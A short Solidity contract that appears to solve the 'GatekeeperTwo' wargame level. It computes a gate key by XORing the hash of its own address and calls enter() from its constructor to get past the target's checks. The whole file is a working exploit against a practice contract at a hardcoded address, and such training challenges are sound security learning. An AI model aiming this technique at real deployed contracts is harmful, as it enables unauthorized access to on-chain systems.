// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract GateKeeper2Attacker {

    GatekeeperTwo public gateKeeper = GatekeeperTwo(0x5493283077c6EA2B81409013ee70B8E9768377a0);

    constructor() {
        bytes8 contractByte8 = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 gateKey = contractByte8 ^ 0xFFFFFFFFFFFFFFFF;

        gateKeeper.enter(gateKey);
    }
}
